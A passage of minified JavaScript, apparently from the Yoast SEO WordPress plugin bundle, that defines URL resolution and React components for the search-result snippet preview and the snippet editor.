x=n.pathname&&"/"===n.pathname.charAt(0),y=e.host||e.pathname&&"/"===e.pathname.charAt(0),E=y||x||n.host&&e.pathname,w=E,O=n.pathname&&n.pathname.split("/")||[],j=(f=e.pathname&&e.pathname.split("/")||[],n.protocol&&!b[n.protocol]);if(j&&(n.hostname="",n.port=null,n.host&&(""===O[0]?O[0]=n.host:O.unshift(n.host)),n.host="",e.protocol&&(e.hostname=null,e.port=null,e.host&&(""===f[0]?f[0]=e.host:f.unshift(e.host)),e.host=null),E=E&&(""===f[0]||""===O[0])),y)n.host=e.host||""===e.host?e.host:n.host,n.hostname=e.hostname||""===e.hostname?e.hostname:n.hostname,n.search=e.search,n.query=e.query,O=f;else if(f.length)O||(O=[]),O.pop(),O=O.concat(f),n.search=e.search,n.query=e.query;else if(!r.isNullOrUndefined(e.search))return j&&(n.hostname=n.host=O.shift(),(A=!!(n.host&&n.host.indexOf("@")>0)&&n.host.split("@"))&&(n.auth=A.shift(),n.host=n.hostname=A.shift())),n.search=e.search,n.query=e.query,r.isNull(n.pathname)&&r.isNull(n.search)||(n.path=(n.pathname?n.pathname:"")+(n.search?n.search:"")),n.href=n.format(),n;if(!O.length)return n.pathname=null,n.search?n.path="/"+n.search:n.path=null,n.href=n.format(),n;for(var S=O.slice(-1)[0],C=(n.host||e.host||O.length>1)&&("."===S||".."===S)||""===S,R=0,_=O.length;_>=0;_--)"."===(S=O[_])?O.splice(_,1):".."===S?(O.splice(_,1),R++):R&&(O.splice(_,1),R--);if(!E&&!w)for(;R--;R)O.unshift("..");!E||""===O[0]||O[0]&&"/"===O[0].charAt(0)||O.unshift(""),C&&"/"!==O.join("/").substr(-1)&&O.push("");var A,M=""===O[0]||O[0]&&"/"===O[0].charAt(0);return j&&(n.hostname=n.host=M?"":O.length?O.shift():"",(A=!!(n.host&&n.host.indexOf("@")>0)&&n.host.split("@"))&&(n.auth=A.shift(),n.host=n.hostname=A.shift())),(E=E||n.host&&O.length)&&!M&&O.unshift(""),O.length?n.pathname=O.join("/"):(n.pathname=null,n.path=null),r.isNull(n.pathname)&&r.isNull(n.search)||(n.path=(n.pathname?n.pathname:"")+(n.search?n.search:"")),n.auth=e.auth||n.auth,n.slashes=n.slashes||e.slashes,n.href=n.format(),n},i.prototype.parseHost=function(){var e=this.host,t=a.exec(e);t&&(":"!==(t=t[0])&&(this.port=t.substr(1)),e=e.substr(0,e.length-t.length)),e&&(this.hostname=e)}},490:function(e,t,n){"use strict";n.r(t),n.d(t,"FixedWidthContainer",(function(){return b})),n.d(t,"HelpTextWrapper",(function(){return T})),n.d(t,"ReplacementVariableEditor",(function(){return Oe.ReplacementVariableEditor})),n.d(t,"replacementVariablesShape",(function(){return Oe.replacementVariablesShape})),n.d(t,"recommendedReplacementVariablesShape",(function(){return Oe.recommendedReplacementVariablesShape})),n.d(t,"SettingsSnippetEditor",(function(){return Oe.SettingsSnippetEditor})),n.d(t,"SnippetEditor",(function(){return ze})),n.d(t,"lengthProgressShape",(function(){return je}));var o=n(1),r=n(3),i=n.n(r),s=n(5),a=n.n(s),l=n(0),c=n.n(l),p=n(79),u=n.n(p),h=n(4);const d=a.a.div`
	overflow: auto;
	width: ${e=>e.widthValue}px;
	padding: 0 ${e=>e.paddingValue}px;
	max-width: 100%;
	box-sizing: border-box;
`,f=a.a.div`
	width: ${e=>e.widthValue}px;
`,m=a.a.div`
	text-align: center;
	margin: 1em 0 5px;
`,g=a.a.div`
	display: inline-block;
	box-sizing: border-box;

	&:before{
		display: inline-block;
		margin-right: 10px;
		font-size: 20px;
		line-height: inherit;
		vertical-align: text-top;
		content: "\\21c4";
		box-sizing: border-box;
	}
`;class b extends r.Component{constructor(e){super(e),this.state={showScrollHint:!1},this.setContainerRef=this.setContainerRef.bind(this),this.determineSize=u()(this.determineSize.bind(this),100)}setContainerRef(e){if(!e)return null;this._container=e,this.determineSize(),window.addEventListener("resize",this.determineSize)}determineSize(){const e=this._container.offsetWidth;this.setState({showScrollHint:e<this.props.width})}componentWillUnmount(){window.removeEventListener("resize",this.determineSize)}render(){const{width:e,padding:t,children:n,className:r,id:s}=this.props,a=e-2*t;return Object(o.createElement)(i.a.Fragment,null,Object(o.createElement)(d,{id:s,className:r,widthValue:e,paddingValue:t,ref:this.setContainerRef},Object(o.createElement)(f,{widthValue:a},n)),this.state.showScrollHint&&Object(o.createElement)(m,null,Object(o.createElement)(g,null,Object(h.__)("Scroll to see the preview content.","wordpress-seo"))))}}b.propTypes={id:c.a.string,width:c.a.number.isRequired,padding:c.a.number,children:c.a.node.isRequired,className:c.a.string},b.defaultProps={id:"",padding:0,className:""};var v=n(54),x=n.n(v),y=n(7),E=n(8),w=n(6),O=n(221);const j=a.a.div`
	& > :first-child {
		overflow: hidden;
		transition: height ${e=>e.duration+"ms"} ease-out;
	}
`;class S extends i.a.Component{resetHeight(e){e.style.height="0"}setHeight(e){const t=function(e){return Math.max(e.clientHeight,e.offsetHeight,e.scrollHeight)}(e);e.style.height=t+"px"}removeHeight(e){e.style.height=null}render(){return Object(o.createElement)(j,{duration:this.props.duration},Object(o.createElement)(O.CSSTransition,{in:this.props.isOpen,timeout:this.props.duration,classNames:"slide",unmountOnExit:!0,onEnter:this.resetHeight,onEntering:this.setHeight,onEntered:this.removeHeight,onExit:this.setHeight,onExiting:this.resetHeight},this.props.children))}}S.propTypes={isOpen:c.a.bool.isRequired,duration:c.a.number.isRequired,children:c.a.node},S.defaultProps={duration:300};const C=a.a.div`
	max-width: 600px;
	font-weight: normal;
	// Don't apply a bottom margin to avoid "jumpiness".
	margin: ${Object(E.getDirectionalStyle)("0 20px 0 25px","0 20px 0 15px")};
`,R=a.a.div`
	max-width: ${e=>e.panelMaxWidth};
`,_=a()(y.Button)`
	min-width: 14px;
	min-height: 14px;
	width: 30px;
	height: 30px;
	border-radius: 50%;
	border: 1px solid transparent;
	box-shadow: none;
	display: block;
	margin: -44px -10px 10px 0;
	background-color: transparent;
	float: ${Object(E.getDirectionalStyle)("right","left")};
	padding: ${Object(E.getDirectionalStyle)("3px 0 0 6px","3px 0 0 5px")};

	&:hover {
		color: ${w.colors.$color_blue};
	}
	&:focus {
		border: 1px solid ${w.colors.$color_blue};
		outline: none;
		box-shadow: 0 0 3px ${Object(w.rgba)(w.colors.$color_blue_dark,.8)};

		svg {
			fill: ${w.colors.$color_blue};
			color: ${w.colors.$color_blue};
		}
	}
	&:active {
		box-shadow: none;
	}
`,A=a()(y.SvgIcon)`
	&:hover {
		fill: ${w.colors.$color_blue};
	}
`;class M extends i.a.Component{constructor(e){super(e),this.state={isExpanded:!1},this.uniqueId=x()("yoast-help-")}onButtonClick(){this.setState({isExpanded:!this.state.isExpanded})}render(){const e=this.uniqueId+"-panel",{isExpanded:t}=this.state;return Object(o.createElement)(C,{className:this.props.className},Object(o.createElement)(_,{className:this.props.className+"__button",onClick:this.onButtonClick.bind(this),"aria-expanded":t,"aria-controls":t?e:null,"aria-label":this.props.helpTextButtonLabel},Object(o.createElement)(A,{size:"16px",color:w.colors.$color_grey_text,icon:"question-circle"})),Object(o.createElement)(S,{isOpen:t},Object(o.createElement)(R,{id:e,className:this.props.className+"__panel",panelMaxWidth:this.props.panelMaxWidth},Object(o.createElement)(y.HelpText,null,this.props.helpText))))}}M.propTypes={className:c.a.string,helpTextButtonLabel:c.a.string.isRequired,panelMaxWidth:c.a.string,helpText:c.a.oneOfType([c.a.string,c.a.array])},M.defaultProps={className:"yoast-help",panelMaxWidth:null,helpText:""};var T=M,P=n(12),F=n.n(P),k=n(30),D=n.n(k),I=n(222),N=n.n(I),U=n(42),V=n(56),L=n(2);const $=a.a.span`
	color: #70757a;
	line-height: 1.7;
`;function q(e){const{shoppingData:t}=e,n=Object(h.sprintf)(Object(h.__)("Rating: %s","wordpress-seo"),Object(L.round)(2*t.rating,1)+"/10"),i=Object(h.sprintf)(Object(h.__)("%s reviews","wordpress-seo"),t.reviewCount);
/* Translators: %s expands to the actual rating, e.g. 8/10. */return Object(o.createElement)($,null,t.reviewCount>0&&Object(o.createElement)(r.Fragment,null,Object(o.createElement)(y.StarRating,{rating:t.rating}),Object(o.createElement)("span",null," ",n," · "),Object(o.createElement)("span",null,i," · ")),t.price&&Object(o.createElement)(r.Fragment,null,Object(o.createElement)("span",{dangerouslySetInnerHTML:{__html:t.price}})),t.availability&&Object(o.createElement)("span",null," · "+Object(L.capitalize)(t.availability)))}var B=q;q.propTypes={shoppingData:c.a.shape({rating:c.a.number,reviewCount:c.a.number,availability:c.a.string,price:c.a.string}).isRequired};const z=a.a.div`
	display: flex;
	margin-top: -16px;
	line-height: 1.6;
`,W=a.a.div`
	flex: 1;
	max-width: 50%;
`,H=a.a.div`
	flex: 1;
	max-width: 25%;
`,G=a.a.div`
	color: #70757a;
`;function K(e){const{shoppingData:t}=e;return Object(o.createElement)(z,null,t.rating>0&&Object(o.createElement)(W,{className:"yoast-shopping-data-preview__column"},Object(o.createElement)("div",{className:"yoast-shopping-data-preview__upper"},Object(h.__)("Rating","wordpress-seo")),Object(o.createElement)(G,{className:"yoast-shopping-data-preview__lower"},Object(o.createElement)("span",null,Object(L.round)(2*t.rating,1),"/10 "),Object(o.createElement)(y.StarRating,{rating:t.rating}),Object(o.createElement)("span",null," (",t.reviewCount,")"))),t.price&&Object(o.createElement)(H,{className:"yoast-shopping-data-preview__column"},Object(o.createElement)("div",{className:"yoast-shopping-data-preview__upper"},Object(h.__)("Price","wordpress-seo")),Object(o.createElement)(G,{className:"yoast-shopping-data-preview__lower",dangerouslySetInnerHTML:{__html:t.price}})),t.availability&&Object(o.createElement)(H,{className:"yoast-shopping-data-preview__column"},Object(o.createElement)("div",{className:"yoast-shopping-data-preview__upper"},Object(h.__)("Availability","wordpress-seo")),Object(o.createElement)(G,{className:"yoast-shopping-data-preview__lower"},Object(L.capitalize)(t.availability))))}var Q=K;K.propTypes={shoppingData:c.a.shape({rating:c.a.number,reviewCount:c.a.number,availability:c.a.string,price:c.a.string}).isRequired};const X=["desktop","mobile"],{transliterate:Y,createRegexFromArray:J,replaceDiacritics:Z}=V.languageProcessing,ee=a()(b)`
	background-color: #fff;
	font-family: arial, sans-serif;
	box-sizing: border-box;
`,te=a.a.div`
	border-bottom: 1px hidden #fff;
	border-radius: 8px;
	box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
	font-family: Arial, Roboto-Regular, HelveticaNeue, sans-serif;
	max-width: ${400}px;
	box-sizing: border-box;
	font-size: 14px;
`,ne=a.a.div`
	cursor: pointer;
	position: relative;
`;function oe(e,t,n){return a()(e)`
		&::before {
			display: block;
			position: absolute;
			top: 0;
			${Object(E.getDirectionalStyle)("left","right")}: ${()=>"desktop"===n?"-22px":"-40px"};
			width: 22px;
			height: 22px;
			background-image: url( ${Object(E.getDirectionalStyle)(Object(w.angleRight)(t),Object(w.angleLeft)(t))} );
			background-size: 24px;
			background-repeat: no-repeat;
			background-position: center;
			content: "";
		}
	`}const re=a.a.div`
	color: ${e=>"desktop"===e.screenMode?"#1a0dab":"#1558d6"};
	text-decoration: none;
	font-size: ${e=>(e.screenMode,"20px")};
	line-height: ${e=>"desktop"===e.screenMode?"1.3":"26px"};
	font-weight: normal;
	margin: 0;
	display: inline-block;
	overflow: hidden;
	max-width: ${600}px;
	vertical-align: top;
	text-overflow: ellipsis;
`,ie=a()(re)`
	max-width: ${600}px;
	vertical-align: top;
	text-overflow: ellipsis;
`,se=a.a.span`
	white-space: nowrap;
`,ae=a.a.span`
	display: inline-block;
	max-height: 52px; // max two lines of text
	padding-top: 1px;
	vertical-align: top;
	overflow: hidden;
	text-overflow: ellipsis;
`,le=a.a.div`
	display: inline-block;
	cursor: pointer;
	position: relative;
	max-width: 90%;
	white-space: nowrap;
	font-size: 14px;
	vertical-align: top;
`,ce=a()(le)`
	overflow: hidden;
	text-overflow: ellipsis;
	max-width: 100%;
	margin-bottom: ${e=>"desktop"===e.screenMode?"0":"12px"};
	padding-top: 1px;
	line-height: ${e=>"desktop"===e.screenMode?"1.5":"20px"};
	vertical-align: ${e=>"desktop"===e.screenMode?"baseline":"top"};
`,pe=a.a.span`
	font-size: ${e=>"desktop"===e.screenMode?"14px":"12px"};
	line-height: ${e=>"desktop"===e.screenMode?"1.3":"20px"};
	color: ${e=>"desktop"===e.screenMode?"#5f6368":"#70757a"};
`,ue=a.a.span`
	color: ${e=>(e.screenMode,"#202124")};
`;ce.displayName="SnippetPreview__BaseUrlOverflowContainer";const he=a.a.div`
	color: ${e=>e.isDescriptionPlaceholder?"4d5156":"#4d5156"};
	cursor: pointer;
	position: relative;
	max-width: ${600}px;
	padding-top: ${e=>"desktop"===e.screenMode?"0":"1px"};
	font-size: 14px;
	line-height: 1.58;
`,de=a.a.div`
	color: ${"#3c4043"};
	font-size: 14px;
	line-height: 20px;
	cursor: pointer;
	position: relative;
	max-width: ${600}px;

	/* Clearing pseudo element to contain the floated image. */
	&:after {
		display: table;
		content: "";
		clear: both;
	}
`,fe=a.a.div`
	float: right;
	width: 104px;
	height: 104px;
	margin: 4px 0 4px 16px;
	border-radius: 8px;
	overflow: hidden;
`,me=a.a.img`
	/* Higher specificity is necessary to make sure inherited CSS rules don't alter the image ratio. */
	&&& {
		display: block;
		width: 104px;
		height: 104px;
		object-fit: cover;
	}
`,ge=a.a.div`
	padding: 12px 16px;

	&:first-child {
		margin-bottom: -16px;
	}
`,be=a.a.div`
`,ve=a.a.div`
	display: inline-block;
	margin-top: 9px;
	margin-left: 6px;
	border-top: 5px solid #70757a;
	border-right: 4px solid transparent;
	border-left: 4px solid transparent;
	vertical-align: top;
`,xe=a.a.span`
	color: ${e=>"desktop"===e.screenMode?"#777":"#70757a"};
`,ye=a.a.img`
	width: 16px;
	height: 16px;
	margin-right: 12px;
	vertical-align: middle;
`,Ee=a.a.div`
	background-size: 100% 100%;
	display: inline-block;
	height: 12px;
	width: 12px;
	margin-bottom: -1px;
	opacity: 0.46;
	margin-right: 6px;
	background-image: url( ${"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAQAAABLCVATAAABr0lEQVR4AbWWJYCUURhFD04Zi7hrLzgFd4nzV9x6wKHinmYb7g4zq71gIw2LWBnZ3Q8df/fh96Tn/t2HVIw4CVKk+fSFNCkSxInxW1pFkhLmoMRjVvFLmkEX5ocuZuBVPw5jv8hh+iEU5QEmuMK+prz7RN3dPMMEGQYzxpH/lGjzou5jgl7mAvOdZfcbF+jbm3MAbFZ7VX9SJnlL1D8UMyjLe+BrAYDb+jJUr59JrlNWRtcqX9GkrPCR4QBAf4qYJAkQoyQrbKKs8RiaEjEI0GvvQ1mLMC9xaBFFBaZS1TbMSwJSomg39erDF+TxpCCNOXjGQJTCvG6qn4ZPzkcxA61Tjhaf4KMj+6Q3XvW6Lopraa8IozRQxIi0a7NXorULc5JyHX/3F3q+0PsFYytVTaGgjz/AvCyiegE69IUsPxHNBMpa738i6tGWlzkAABjKe/+j9YeRHGVd9oWRnwe2ewDASp/L/UqoPQ5AmFeYZMavBP8dAJz0GWWDHQlzXApMdz4KYUfKICcxkKeOfGmQyrIPcgE9m+g/+kT812/Nr3+0kqzitxQjoKXh6xfor99nlEdFjyvH15gAAAAASUVORK5CYII="} );
`;class we extends r.PureComponent{constructor(e){super(e),this.state={title:e.title,description:e.description,isDescriptionPlaceholder:!0},this.setTitleRef=this.setTitleRef.bind(this),this.setDescriptionRef=this.setDescriptionRef.bind(this)}setTitleRef(e){this._titleElement=e}setDescriptionRef(e){this._descriptionElement=e}hasOverflowedContent(e){return Math.abs(e.clientHeight-e.scrollHeight)>=2}fitTitle(){const e=this._titleElement;if(this.hasOverflowedContent(e)){let t=this.state.title;const n=e.clientWidth/3;t.length>n&&(t=t.substring(0,n));const o=this.dropLastWord(t);this.setState({title:o})}}dropLastWord(e){const t=e.split(" ");return t.pop(),t.join(" ")}getTitle(){return this.props.title!==this.state.title?this.state.title+" ...":this.props.title}getDescription(){return this.props.description?N()(this.props.description,{length:156,separator:" ",omission:" ..."}):Object(h.__)("Please provide a meta description by editing the snippet below. If you don’t, Google will try to find a relevant part of your post to show in the search results.","wordpress-seo")}renderDate(){const e="desktop"===this.props.mode?"—":"－";return this.props.date&&Object(o.createElement)(xe,{screenMode:this.props.mode},this.props.date," ",e," ")}addCaretStyles(e,t){const{mode:n,hoveredField:o,activeField:r}=this.props;return r===e?oe(t,w.colors.$color_snippet_active,n):o===e?oe(t,w.colors.$color_snippet_hover,n):t}getBreadcrumbs(e){const{breadcrumbs:t}=this.props,n=encodeURI(e.replace(/\?|#/g,"")),{hostname:o,pathname:r}=Object(U.parse)(n),i=" › "+(t||r.split("/")).filter(e=>!!e).join(" › ");return{hostname:decodeURI(o),breadcrumbs:decodeURI(i)}}renderUrl(){const{url:e,onMouseUp:t,onMouseEnter:n,onMouseLeave:r,mode:s,faviconSrc:a}=this.props,l="mobile"===s,c=Z(e),{hostname:p,breadcrumbs:u}=this.getBreadcrumbs(c),d=this.addCaretStyles("url",le);return Object(o.createElement)(i.a.Fragment,null,Object(o.createElement)(y.ScreenReaderText,null,Object(h.__)("Url preview","wordpress-seo")+":"),Object(o.createElement)(d,null,Object(o.createElement)(ce,{onMouseUp:t.bind(null,"url"),onMouseEnter:n.bind(null,"url"),onMouseLeave:r.bind(null),screenMode:s},l&&Object(o.createElement)(ye,{src:a||"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABs0lEQVR4AWL4//8/RRjO8Iucx+noO0MWUDo16FYABMGP6ZfUcRnWtm27jVPbtm3bttuH2t3eFPcY9pLz7NxiLjCyVd87pKnHyqXyxtCs8APd0rnyxiu4qSeA3QEDrAwBDrT1s1Rc/OrjLZwqVmOSu6+Lamcpp2KKMA9PH1BYXMe1mUP5qotvXTywsOEEYHXxrY+3cqk6TMkYpNr2FeoY3KIr0RPtn9wQ2unlA+GMkRw6+9TFw4YTwDUzx/JVvARj9KaedXRO8P5B1Du2S32smzqUrcKGEyA+uAgQjKX7zf0boWHGfn71jIKj2689gxp7OAGShNcBUmLMPVjZuiKcA2vuWHHDCQxMCz629kXAIU4ApY15QwggAFbfOP9DhgBJ+nWVJ1AZAfICAj1pAlY6hCADZnveQf7bQIwzVONGJonhLIlS9gr5mFg44Xd+4S3XHoGNPdJl1INIwKyEgHckEhgTe1bGiFY9GSFBYUwLh1IkiJUbY407E7syBSFxKTszEoiE/YdrgCEayDmtaJwCI9uu8TKMuZSVfSa4BpGgzvomBR/INhLGzrqDotp01ZR8pn/1L0JN9d9XNyx0AAAAAElFTkSuQmCC",alt:""}),Object(o.createElement)(pe,{screenMode:s},Object(o.createElement)(ue,null,p),u))))}componentWillReceiveProps(e){const t={};this.props.title!==e.title&&(t.title=e.title),this.props.description!==e.description&&(t.description=e.description),this.setState(t)}componentDidUpdate(){this.setState({isDescriptionPlaceholder:!this.props.description}),"mobile"===this.props.mode&&(clearTimeout(this.fitTitleTimeout),this.fitTitleTimeout=setTimeout(()=>{this.fitTitle()},10))}componentDidMount(){this.setState({isDescriptionPlaceholder:!this.props.description})}componentWillUnmount(){clearTimeout(this.fitTitleTimeout)}renderDescription(){const{wordsToHighlight:e,locale:t,onMouseUp:n,onMouseLeave:r,onMouseEnter:i,mode:s,mobileImageSrc:a}=this.props,l=this.renderDate(),c={isDescriptionPlaceholder:this.state.isDescriptionPlaceholder,onMouseUp:n.bind(null,"description"),onMouseEnter:i.bind(null,"description"),onMouseLeave:r.bind(null)};if("desktop"===s){const n=this.addCaretStyles("description",he);return Object(o.createElement)(n,F()({},c,{ref:this.setDescriptionRef}),l,function(e,t,n,r){if(0===t.length)return n;let i=n;const s=[];t.forEach((function(t){t=t,s.push(t);const n=Y(t,e);n!==t&&s.push(n)}));const a=J(s,!1,"",!1);return i=i.replace(a,(function(e){return`{{strong}}${e}{{/strong}}`})),D()({mixedString:i,components:{strong:Object(o.createElement)("strong",null)}})}(t,e,this.getDescription()))}if("mobile"===s){const e=this.addCaretStyles("description",de);return Object(o.createElement)(e,c,Object(o.createElement)(de,{isDescriptionPlaceholder:this.state.isDescriptionPlaceholder,ref:this.setDescriptionRef},a&&Object(o.createElement)(fe,null,Object(o.createElement)(me,{src:a,alt:""})),l,this.getDescription()))}return null}renderProductData(e){const{mode:t,shoppingData:n}=this.props;return 0===Object.values(n).length?null:"desktop"===t?Object(o.createElement)(e,{className:"yoast-shopping-data-preview--desktop"},Object(o.createElement)(y.ScreenReaderText,null,Object(h.__)("Shopping data preview:","wordpress-seo")),Object(o.createElement)(B,{shoppingData:n})):"mobile"===t?Object(o.createElement)(e,{className:"yoast-shopping-data-preview--mobile"},Object(o.createElement)(y.ScreenReaderText,null,Object(h.__)("Shopping data preview:","wordpress-seo")),Object(o.createElement)(Q,{shoppingData:n})):null}render(){const{onMouseUp:e,onMouseLeave:t,onMouseEnter:n,mode:r,isAmp:i}=this.props,{PartContainer:s,Container:a,TitleUnbounded:l,SnippetTitle:c}=this.getPreparedComponents(r),p="desktop"===r,u=p?Object(o.createElement)(ve,null):null,d=p||!i?null:Object(o.createElement)(Ee,null);return Object(o.createElement)("section",null,Object(o.createElement)(a,{id:"yoast-snippet-preview-container",width:p?640:null,padding:20},Object(o.createElement)(s,null,this.renderUrl(),u,Object(o.createElement)(y.ScreenReaderText,null,Object(h.__)("SEO title preview","wordpress-seo")+":"),Object(o.createElement)(c,{onMouseUp:e.bind(null,"title"),onMouseEnter:n.bind(null,"title"),onMouseLeave:t.bind(null)},Object(o.createElement)(ie,{screenMode:r},Object(o.createElement)(l,{ref:this.setTitleRef},this.getTitle()))),d),Object(o.createElement)(s,null,Object(o.createElement)(y.ScreenReaderText,null,Object(h.__)("Meta description preview:","wordpress-seo")),this.renderDescription()),this.renderProductData(s)))}getPreparedComponents(e){return{PartContainer:"desktop"===e?be:ge,Container:"desktop"===e?ee:te,TitleUnbounded:"desktop"===e?se:ae,SnippetTitle:this.addCaretStyles("title",ne)}}}we.propTypes={title:c.a.string.isRequired,url:c.a.string.isRequired,description:c.a.string.isRequired,date:c.a.string,breadcrumbs:c.a.array,hoveredField:c.a.string,activeField:c.a.string,keyword:c.a.string,wordsToHighlight:c.a.array,locale:c.a.string,mode:c.a.oneOf(X),isAmp:c.a.bool,faviconSrc:c.a.string,mobileImageSrc:c.a.string,shoppingData:c.a.object,onMouseUp:c.a.func.isRequired,onHover:c.a.func,onMouseEnter:c.a.func,onMouseLeave:c.a.func},we.defaultProps={date:"",keyword:"",wordsToHighlight:[],breadcrumbs:null,locale:"en",hoveredField:"",activeField:"",mode:"mobile",isAmp:!1,faviconSrc:"",mobileImageSrc:"",shoppingData:{},onHover:()=>{},onMouseEnter:()=>{},onMouseLeave:()=>{}};var Oe=n(16);const je=c.a.shape({max:c.a.number,actual:c.a.number,score:c.a.number}),Se=a.a.input`
	border: none;
	width: 100%;
	height: inherit;
	line-height: 1.71428571; // 24px based on 14px font-size
	font-family: inherit;
	font-size: inherit;
	color: inherit;

	&:focus {
		outline: 0;
	}
`,Ce=Object(w.withCaretStyles)(y.VariableEditorInputContainer);class Re extends i.a.Component{constructor(e){super(e),this.elements={title:null,slug:null,description:null},this.uniqueId=x()("snippet-editor-field-"),this.setRef=this.setRef.bind(this),this.setTitleRef=this.setTitleRef.bind(this),this.setSlugRef=this.setSlugRef.bind(this),this.setDescriptionRef=this.setDescriptionRef.bind(this),this.triggerReplacementVariableSuggestions=this.triggerReplacementVariableSuggestions.bind(this),this.onFocusTitle=this.onFocusTitle.bind(this),this.onChangeTitle=this.onChangeTitle.bind(this),this.onFocusSlug=this.onFocusSlug.bind(this),this.focusSlug=this.focusSlug.bind(this),this.onChangeSlug=this.onChangeSlug.bind(this),this.onFocusDescription=this.onFocusDescription.bind(this),this.onChangeDescription=this.onChangeDescription.bind(this)}setRef(e,t){this.elements[e]=t}setTitleRef(e){this.setRef("title",e)}setSlugRef(e){this.setRef("slug",e)}setDescriptionRef(e){this.setRef("description",e)}componentDidUpdate(e){e.activeField!==this.props.activeField&&this.focusOnActiveFieldChange()}focusOnActiveFieldChange(){const{activeField:e}=this.props,t=e?this.elements[e]:null;t&&t.focus()}triggerReplacementVariableSuggestions(e){this.elements[e].triggerReplacementVariableSuggestions()}onFocusTitle(){this.props.onFocus("title")}onChangeTitle(e){this.props.onChange("title",e)}onFocusSlug(){this.props.onFocus("slug")}focusSlug(){this.elements.slug.focus()}onChangeSlug(e){this.props.onChange("slug",e.target.value)}onFocusDescription(){this.props.onFocus("description")}onChangeDescription(e){this.props.onChange("description",e)}render(){const{activeField:e,hoveredField:t,onReplacementVariableSearchChange:n,replacementVariables:r,recommendedReplacementVariables:i,titleLengthProgress:s,descriptionLengthProgress:a,onBlur:l,descriptionEditorFieldPlaceholder:c,data:{title:p,slug:u,description:d},containerPadding:f,titleInputId:m,slugInputId:g,descriptionInputId:b}=this.props,v=this.uniqueId+"-slug";return Object(o.createElement)(Oe.StyledEditor,{padding:f},Object(o.createElement)(Oe.ReplacementVariableEditor,{withCaret:!0,label:Object(h.__)("SEO title","wordpress-seo"),onFocus:this.onFocusTitle,onBlur:l,isActive:"title"===e,isHovered:"title"===t,editorRef:this.setTitleRef,replacementVariables:r,recommendedReplacementVariables:i,content:p,onChange:this.onChangeTitle,onSearchChange:n,fieldId:m,type:"title"}),Object(o.createElement)(y.ProgressBar,{max:s.max,value:s.actual,progressColor:this.getProgressColor(s.score)}),Object(o.createElement)(y.SimulatedLabel,{id:v,onClick:this.onFocusSlug},Object(h.__)("Slug","wordpress-seo")),Object(o.createElement)(Ce,{onClick:this.focusSlug,isActive:"slug"===e,isHovered:"slug"===t},Object(o.createElement)(Se,{value:u,onChange:this.onChangeSlug,onFocus:this.onFocusSlug,onBlur:l,ref:this.setSlugRef,"aria-labelledby":this.uniqueId+"-slug",id:g})),Object(o.createElement)(Oe.ReplacementVariableEditor,{withCaret:!0,type:"description",placeholder:c,label:Object(h.__)("Meta description","wordpress-seo"),onFocus:this.onFocusDescription,onBlur:l,isActive:"description"===e,isHovered:"description"===t,editorRef:this.setDescriptionRef,replacementVariables:r,recommendedReplacementVariables:i,content:d,onChange:this.onChangeDescription,onSearchChange:n,fieldId:b}),Object(o.createElement)(y.ProgressBar,{max:a.max,value:a.actual,progressColor:this.getProgressColor(a.score)}))}getProgressColor(e){return e>=7?w.colors.$color_good:e>=5?w.colors.$color_ok:w.colors.$color_bad}}Re.propTypes={replacementVariables:Oe.replacementVariablesShape,recommendedReplacementVariables:Oe.recommendedReplacementVariablesShape,onChange:c.a.func.isRequired,onFocus:c.a.func,onBlur:c.a.func,onReplacementVariableSearchChange:c.a.func,data:c.a.shape({title:c.a.string.isRequired,slug:c.a.string.isRequired,description:c.a.string.isRequired}).isRequired,activeField:c.a.oneOf(["title","slug","description"]),hoveredField:c.a.oneOf(["title","slug","description"]),titleLengthProgress:je,descriptionLengthProgress:je,descriptionEditorFieldPlaceholder:c.a.string,containerPadding:c.a.string,titleInputId:c.a.string,slugInputId:c.a.string,descriptionInputId:c.a.string},Re.defaultProps={replacementVariables:[],recommendedReplacementVariables:[],onFocus:()=>{},onBlur:()=>{},onReplacementVariableSearchChange:null,activeField:null,hoveredField:null,titleLengthProgress:{max:600,actual:0,score:0},descriptionLengthProgress:{max:156,actual:0,score:0},descriptionEditorFieldPlaceholder:null,containerPadding:"0 20px",titleInputId:"yoast-google-preview-title",slugInputId:"yoast-google-preview-slug",descriptionInputId:"yoast-google-preview-description"};var _e=Re;const Ae=a.a.fieldset`
	border: 0;
	padding: 0;
	margin: 0 0 16px;
`,Me=a.a.legend`
	margin: 8px 0;
	padding: 0;
	color: ${w.colors.$color_headings};
	font-size: 14px;
	font-weight: 600;
`,Te=a()(y.Label)`
	${Object(E.getDirectionalStyle)("margin-right: 16px","margin-left: 16px")};
	color: inherit;
	font-size: 14px;
	line-height: 1.71428571;
	cursor: pointer;
	/* Helps RTL in Chrome */
	display: inline-block;
`,Pe=a()(y.Input)`
	&& {
		${Object(E.getDirectionalStyle)("margin: 0 8px 0 0","margin: 0 0 0 8px")};
		cursor: pointer;
	}
`;class Fe extends r.Component{constructor(e){super(e),this.switchToMobile=this.props.onChange.bind(this,"mobile"),this.switchToDesktop=this.props.onChange.bind(this,"desktop")}render(){const{active:e,mobileModeInputId:t,desktopModeInputId:n}=this.props,r=t.length>0?t:"yoast-google-preview-mode-mobile",i=n.length>0?n:"yoast-google-preview-mode-desktop";return Object(o.createElement)(Ae,null,Object(o.createElement)(Me,null,Object(h.__)("Preview as:","wordpress-seo")),Object(o.createElement)(Pe,{onChange:this.switchToMobile,type:"radio",name:"screen",value:"mobile",optionalAttributes:{id:r,checked:"mobile"===e}}),Object(o.createElement)(Te,{for:r},Object(h.__)("Mobile result","wordpress-seo")),Object(o.createElement)(Pe,{onChange:this.switchToDesktop,type:"radio",name:"screen",value:"desktop",optionalAttributes:{id:i,checked:"desktop"===e}}),Object(o.createElement)(Te,{for:i},Object(h.__)("Desktop result","wordpress-seo")))}}Fe.propTypes={onChange:c.a.func.isRequired,active:c.a.oneOf(X),mobileModeInputId:c.a.string,desktopModeInputId:c.a.string},Fe.defaultProps={active:"mobile",mobileModeInputId:"",desktopModeInputId:""};var ke=Fe;const{MetaDescriptionLengthAssessment:De,PageTitleWidthAssessment:Ie}=V.assessments.seo,{measureTextWidth:Ne}=V.helpers,Ue=a()(y.Button)`
	height: 33px;
	border: 1px solid #dbdbdb;
	box-shadow: none;
	font-family: Arial, Roboto-Regular, HelveticaNeue, sans-serif;
`,Ve=a()(Ue)`
	margin: ${Object(E.getDirectionalStyle)("10px 0 0 4px","10px 4px 0 0")};
	fill: ${w.colors.$color_grey_dark};
	padding-left: 8px;

